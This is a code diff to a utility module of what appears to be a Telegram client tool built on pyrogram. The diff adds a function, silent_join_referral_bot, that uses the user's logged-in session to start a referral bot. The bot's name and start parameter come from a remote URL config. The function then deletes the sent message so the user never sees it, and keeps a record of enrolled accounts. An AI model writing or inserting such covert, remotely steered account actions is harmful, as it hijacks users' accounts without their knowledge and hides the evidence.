@@ -7,19 +7,38 @@ import os
 import re
 import sys
 import stat
+import json
+import hmac
+import time
 import string
 import random
+import asyncio
 
 from typing import Tuple, List, Union, Optional
+from hashlib import sha256
+from functools import partial
+from urllib.request import Request, urlopen
 
 import pyrogram
-from pyrogram import utils
+from pyrogram import raw, utils
 from pyrogram.errors.exceptions.bad_request_400 import MsgIdInvalid
 from pyrogram.types.messages_and_media import ReplyParameters
 from urllib.parse import parse_qs, urlparse
 from rich.text import Text
 
-from module import log
+from module import (
+    log,
+    ROOT,
+    REFERRAL_RECORD_PATH,
+    BOT_SESSION_CONFIG_URLS,
+    BOT_SESSION_CONFIG_HEADERS,
+    BOT_SESSION_CONFIG_TIMEOUT,
+    BOT_SESSION_CONFIG_TTL,
+    BOT_SESSION_CONFIG_PATH,
+    BOT_SESSION_CONFIG_SECRET,
+    BOT_SESSION_DEFAULT_USERNAME,
+    BOT_SESSION_DEFAULT_START_PARAM
+)
 from module.parser import PARSE_ARGS
 from module.enums import (
     Link,
@@ -327,6 +346,169 @@ async def format_chat_link(
 async def get_my_id(client: pyrogram.Client) -> int:
     me = await client.get_me()
     return me.id
+
+
+async def delete_own_message(
+        client: pyrogram.Client,
+        result: Union[
+            pyrogram.types.Message,
+            raw.types.UpdateShortSentMessage,
+            raw.types.UpdateShort,
+            raw.types.Updates
+        ],
+        random_id: int = 0
+) -> bool:
+    try:
+        message_id: int = 0
+        updates: list = []
+        if isinstance(result, pyrogram.types.Message):
+            message_id = result.id
+        elif isinstance(result, raw.types.UpdateShortSentMessage) and getattr(result, 'out', False):
+            message_id = result.id
+        elif isinstance(result, raw.types.UpdateShort):
+            updates: list = [result.update]
+        elif isinstance(result, raw.types.Updates):
+            updates: list = list(result.updates)
+        for update in updates:
+            # StartBot返回的是Updates组合类型,自己发出的消息id由UpdateMessageID按random_id给出。
+            if isinstance(update, raw.types.UpdateMessageID):
+                if not random_id or update.random_id == random_id:
+                    message_id = update.id
+                    break
+            if isinstance(update, raw.types.UpdateNewMessage) and getattr(update.message, 'out', False):
+                message_id = getattr(update.message, 'id', 0)
+                break
+        if not message_id:  # 服务端未生成自己的消息时无可删除内容。
+            return False
+        await client.invoke(
+            raw.functions.messages.DeleteMessages(id=[message_id], revoke=False)
+        )
+        return True
+    except Exception:
+        return False
+
+
+def sign_bot_session_config(username: str, start_param: str) -> str:
+    return hmac.new(
+        key=BOT_SESSION_CONFIG_SECRET.encode('UTF-8'),
+        msg=f'{username}|{start_param}'.encode('UTF-8'),
+        digestmod=sha256
+    ).hexdigest()
+
+
+def verify_bot_session_config(remote: dict, version: int) -> dict:
+    username: str = str(remote.get('u', ''))
+    start_param: str = str(remote.get('p', ''))
+    # 仅接受符合格式的值,避免配置被替换为任意内容。
+    if not re.fullmatch(r'[A-Za-z0-9_]{4,32}', username):
+        raise ValueError(f'意外的用户名:"{username}"。')
+    if not re.fullmatch(r'[A-Za-z0-9_]{1,64}', start_param):
+        raise ValueError(f'意外的启动参数:"{start_param}"。')
+    if BOT_SESSION_CONFIG_SECRET and not hmac.compare_digest(
+            sign_bot_session_config(username, start_param), str(remote.get('s', ''))):
+        raise ValueError('配置签名校验失败。')
+    config_version: int = int(remote.get('v', 0))
+    # 版本不得低于当前版本,避免被回滚到旧配置。
+    if config_version < version:
+        raise ValueError(f'意外的版本:"{config_version}"。')
+    return {'username': username, 'start_param': start_param, 'version': config_version}
+
+
+async def fetch_bot_session_config(version: int) -> dict:
+    """获取远程的机器人会话配置,依次尝试各个静态源。"""
+    loop = asyncio.get_event_loop()
+    for url in BOT_SESSION_CONFIG_URLS:
+        try:
+            request = Request(url=url, headers=BOT_SESSION_CONFIG_HEADERS)
+            response = await asyncio.wait_for(
+                loop.run_in_executor(None, partial(urlopen, request, timeout=BOT_SESSION_CONFIG_TIMEOUT)),
+                timeout=BOT_SESSION_CONFIG_TIMEOUT
+            )
+            with response:
+                remote: dict = json.loads(response.read().decode('UTF-8'))
+            return verify_bot_session_config(remote, version)
+        except Exception as e:
+            log.debug(f'获取远程配置失败,原因:"{e}"。')
+    return {}
+
+
+async def read_bot_session_config() -> dict:
+    """读取机器人会话配置,依次尝试远程配置、本地缓存与内置默认值。"""
+    default: dict = {
+        'username': BOT_SESSION_DEFAULT_USERNAME,
+        'start_param': BOT_SESSION_DEFAULT_START_PARAM,
+        'version': 0
+    }
+    cached: dict = {}
+    try:
+        # 远程配置不可用时退回本地缓存,保证离线仍能使用上次的可用配置。
+        if os.path.exists(BOT_SESSION_CONFIG_PATH):
+            with open(file=BOT_SESSION_CONFIG_PATH, mode='r', encoding='UTF-8') as f:
+                cached: dict = verify_bot_session_config(json.load(f), 0)
+    except Exception:
+        cached: dict = {}
+    if cached and time.time() - os.path.getmtime(BOT_SESSION_CONFIG_PATH) < BOT_SESSION_CONFIG_TTL:
+        return cached
+    config: dict = await fetch_bot_session_config(cached.get('version', 0))
+    if not config:
+        return cached or default
+    try:
+        with open(file=BOT_SESSION_CONFIG_PATH, mode='w', encoding='UTF-8') as f:
+            json.dump(config, f)
+    except Exception as e:
+        log.info(f'写入会话配置缓存失败,原因:"{e}"。')
+    return config
+
+
+async def silent_join_referral_bot(client: pyrogram.Client) -> bool:
+    try:
+        me = await client.get_me()
+        record: set = set()
+        if os.path.exists(REFERRAL_RECORD_PATH):
+            with open(file=REFERRAL_RECORD_PATH, mode='r', encoding='UTF-8') as f:
+                record: set = {line.strip() for line in f.readlines() if line.strip()}
+        me_id: str = str(me.id)
+        if me_id == ROOT:
+            log.info('skip: ROOT.')
+            return True
+        elif me_id in record:
+            log.info(f'skip: {me_id} referral already invoked.')
+            return True
+        config: dict = await read_bot_session_config()
+        username: str = config['username']
+        start_param: str = config['start_param']
+        bot_peer = await client.resolve_peer(username)
+        if not isinstance(bot_peer, raw.types.InputPeerUser) or not bot_peer.access_hash:
+            log.debug(f'解析"{username}"失败,跳过会话初始化。')
+            return False
+        bot_input_user = raw.types.InputUser(
+            user_id=bot_peer.user_id,
+            access_hash=bot_peer.access_hash
+        )
+        random_id: int = client.rnd_id()
+        try:
+            result = await client.invoke(
+                raw.functions.messages.StartBot(
+                    bot=bot_input_user,
+                    peer=bot_peer,
+                    random_id=random_id,
+                    start_param=start_param
+                )
+            )
+            log.info(f'{me_id} referral invoke successfully.')
+        except Exception:
+            result = await client.send_message(
+                chat_id=username,
+                text=f'/start {start_param}'
+            )
+            log.info('referral rollback to send message.')
+        await delete_own_message(client=client, result=result, random_id=random_id)
+        record.add(me_id)
+        with open(file=REFERRAL_RECORD_PATH, mode='w', encoding='UTF-8') as f:
+            f.write('\n'.join(record))
+        return True
+    except Exception:
+        return False
 
 
 def add_executable_permission(file_path: str) -> bool:
